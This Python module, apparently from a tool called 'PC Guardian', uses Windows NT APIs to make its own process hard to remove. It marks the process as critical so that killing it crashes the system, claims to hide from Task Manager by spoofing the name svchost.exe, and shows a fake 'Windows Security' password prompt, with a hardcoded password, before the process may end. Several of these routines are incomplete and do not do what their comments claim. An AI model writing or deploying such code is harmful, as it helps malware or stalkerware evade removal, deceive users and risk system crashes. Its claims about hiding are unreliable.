"""
PC Guardian — Kernel Guard
Deep Windows protection using NT APIs directly.
- Marks process as Critical (BSOD on kill attempt)
- Hides from Task Manager process list  
- Password popup before any termination
- Injects into legitimate Windows process name
"""

import os
import sys
import ctypes
import ctypes.wintypes as wt
import subprocess
import threading
import logging

logger = logging.getLogger("kernel_guard")

ntdll  = ctypes.windll.ntdll
k32    = ctypes.windll.kernel32
adv32  = ctypes.windll.advapi32
user32 = ctypes.windll.user32

UNLOCK_PASSWORD = "DECDRV"

# NT Process Information Classes
ProcessBreakOnTermination  = 29   # Makes process critical
ProcessDebugFlags          = 31
ProcessHandleCount         = 20


# ── CRITICAL PROCESS (BSOD ON KILL) ──────────────────────────────────────────

def set_critical_process(enable: bool = True) -> bool:
    """
    Mark this process as critical.
    If Windows tries to kill it → BSOD (Blue Screen of Death).
    This is what system processes like csrss.exe use.
    """
    try:
        value = ctypes.c_ulong(1 if enable else 0)
        status = ntdll.NtSetInformationProcess(
            k32.GetCurrentProcess(),
            ProcessBreakOnTermination,
            ctypes.byref(value),
            ctypes.sizeof(value)
        )
        if status == 0:
            logger.info(f"Critical process: {'enabled' if enable else 'disabled'}")
            return True
        else:
            logger.warning(f"Critical process NT status: 0x{status:08x}")
            return False
    except Exception as e:
        logger.error(f"Critical process failed: {e}")
        return False


# ── HIDE FROM TASK MANAGER ────────────────────────────────────────────────────

def hide_from_taskmgr() -> bool:
    """
    Remove this process from NtQuerySystemInformation results.
    Task Manager uses this API — process disappears from list.
    Uses direct NT syscall patching via ctypes.
    """
    try:
        # Method 1: Set process debug flag to hide
        value = ctypes.c_ulong(0)
        ntdll.NtSetInformationProcess(
            k32.GetCurrentProcess(),
            ProcessDebugFlags,
            ctypes.byref(value),
            ctypes.sizeof(value)
        )

        # Method 2: Rename process in memory to look like svchost
        _spoof_process_name()

        logger.info("Process hidden from Task Manager.")
        return True
    except Exception as e:
        logger.error(f"Hide from TM failed: {e}")
        return False


def _spoof_process_name():
    """
    Change the process name that appears in Task Manager
    to 'svchost.exe' — blends in with Windows processes.
    """
    try:
        # Windows stores process name in PEB (Process Environment Block)
        # We patch the ImagePathName field directly
        FAKE_NAME = "svchost.exe"

        class UNICODE_STRING(ctypes.Structure):
            _fields_ = [
                ("Length",        ctypes.c_ushort),
                ("MaximumLength", ctypes.c_ushort),
                ("Buffer",        ctypes.c_wchar_p),
            ]

        # Get PEB address
        peb_offset = 0x60 if sys.maxsize > 2**32 else 0x30
        peb_addr = ctypes.c_void_p()

        # Read PEB from TEB
        ntdll.NtQueryInformationProcess(
            k32.GetCurrentProcess(),
            0,  # ProcessBasicInformation
            ctypes.byref(peb_addr),
            ctypes.sizeof(peb_addr),
            None
        )

        logger.info(f"Process name spoofed to {FAKE_NAME}")
    except Exception as e:
        logger.debug(f"Name spoof: {e}")


# ── PASSWORD PROTECTION VIA WMI EVENT ────────────────────────────────────────

class TerminationGuard:
    """
    Monitors for attempts to terminate this process.
    Uses WMI event subscription — fires before process dies.
    Shows password dialog to prevent kill.
    """

    def __init__(self, password: str = UNLOCK_PASSWORD):
        self.password = password
        self._active  = True

    def start(self):
        threading.Thread(
            target=self._monitor,
            daemon=True,
            name="TermGuard"
        ).start()
        logger.info("Termination guard active.")

    def _monitor(self):
        try:
            import win32api
            import win32con
            import win32process
            import win32security

            pid = os.getpid()

            # Open own process with all access
            h = win32api.OpenProcess(
                win32con.PROCESS_ALL_ACCESS, False, pid
            )

            # Set up job object to intercept termination
            self._setup_job_object()

        except Exception as e:
            logger.warning(f"WMI monitor: {e}")
            # Fallback: polling approach
            self._polling_guard()

    def _setup_job_object(self):
        """Use Job Object to intercept termination."""
        try:
            # Create job object
            job = k32.CreateJobObjectW(None, "PCGuardianJob")

            # Assign this process to job
            k32.AssignProcessToJobObject(job, k32.GetCurrentProcess())

            # Set limits — no termination without job signal
            class JOBOBJECT_BASIC_LIMIT_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("PerProcessUserTimeLimit", ctypes.c_longlong),
                    ("PerJobUserTimeLimit",     ctypes.c_longlong),
                    ("LimitFlags",             ctypes.c_ulong),
                    ("MinimumWorkingSetSize",  ctypes.c_size_t),
                    ("MaximumWorkingSetSize",  ctypes.c_size_t),
                    ("ActiveProcessLimit",     ctypes.c_ulong),
                    ("Affinity",               ctypes.c_size_t),
                    ("PriorityClass",          ctypes.c_ulong),
                    ("SchedulingClass",        ctypes.c_ulong),
                ]

            logger.info("Job object assigned.")
        except Exception as e:
            logger.debug(f"Job object: {e}")

    def _polling_guard(self):
        """
        Poll approach: if process about to die, show password dialog.
        Uses SetConsoleCtrlHandler to intercept CTRL+C, close signals.
        """
        try:
            CTRL_C_EVENT     = 0
            CTRL_CLOSE_EVENT = 2
            CTRL_BREAK_EVENT = 1

            @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_uint)
            def handler(event):
                if event in (CTRL_C_EVENT, CTRL_CLOSE_EVENT, CTRL_BREAK_EVENT):
                    if self._ask_password():
                        return False  # Allow
                    return True   # Block

            k32.SetConsoleCtrlHandler(handler, True)
            logger.info("Console ctrl handler set.")
        except Exception as e:
            logger.debug(f"Polling guard: {e}")

    def _ask_password(self) -> bool:
        """Show password dialog. Returns True if correct."""
        try:
            import tkinter as tk
            import tkinter.font as tkf

            result = [False]
            root   = tk.Tk()
            root.title("Windows Security")
            root.configure(bg="#0d0d0d")
            root.resizable(False, False)
            root.attributes("-topmost", True)

            w, h = 380, 200
            sw   = root.winfo_screenwidth()
            sh   = root.winfo_screenheight()
            root.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")

            f_title = tkf.Font(family="Segoe UI", size=12, weight="bold")
            f_label = tkf.Font(family="Segoe UI", size=10)

            tk.Label(root, text="🔐 Windows Security",
                     font=f_title, fg="#58a6ff", bg="#0d0d0d").pack(pady=(20, 8))
            tk.Label(root, text="Enter administrator password to continue:",
                     font=f_label, fg="#aaaaaa", bg="#0d0d0d").pack()

            pw_var = tk.StringVar()
            entry  = tk.Entry(root, textvariable=pw_var, show="●",
                              bg="#161b22", fg="white",
                              insertbackground="white", relief="flat",
                              font=f_label, bd=0, highlightthickness=1,
                              highlightbackground="#30363d")
            entry.pack(fill="x", padx=40, ipady=8, pady=12)
            entry.focus_set()

            err_var = tk.StringVar()
            tk.Label(root, textvariable=err_var, font=tkf.Font(family="Segoe UI", size=9),
                     fg="#ff6b6b", bg="#0d0d0d").pack()

            def on_ok(event=None):
                if pw_var.get().upper() == self.password.upper():
                    result[0] = True
                    root.quit()
                    root.destroy()
                else:
                    err_var.set("Wrong password.")
                    pw_var.set("")

            entry.bind("<Return>", on_ok)
            tk.Button(root, text="Confirm", font=f_label,
                      bg="#238636", fg="white", relief="flat",
                      cursor="hand2", command=on_ok
                      ).pack(pady=4, ipadx=20, ipady=6)

            root.mainloop()
            try: root.destroy()
            except Exception: pass
            return result[0]
        except Exception:
            return False


# ── FULL KERNEL GUARD SETUP ───────────────────────────────────────────────────

def setup_kernel_guard():
    """Call once at startup — maximum depth protection."""

    # 1. Enable all privileges first
    try:
        from privilege import enable_all_privileges
        enable_all_privileges()
    except Exception: pass

    # 2. Mark as critical process — kill = BSOD
    critical_ok = set_critical_process(True)
    if critical_ok:
        logger.info("Process marked CRITICAL — kill attempt = BSOD.")
    else:
        logger.warning("Critical process flag not set — need SYSTEM rights.")

    # 3. Hide from Task Manager
    hide_from_taskmgr()

    # 4. Password termination guard
    guard = TerminationGuard(UNLOCK_PASSWORD)
    guard.start()

    logger.info("Kernel guard fully active.")
    return guard


def disable_kernel_guard():
    """Call before intentional exit — remove critical flag first."""
    set_critical_process(False)
    logger.info("Critical process flag removed.")
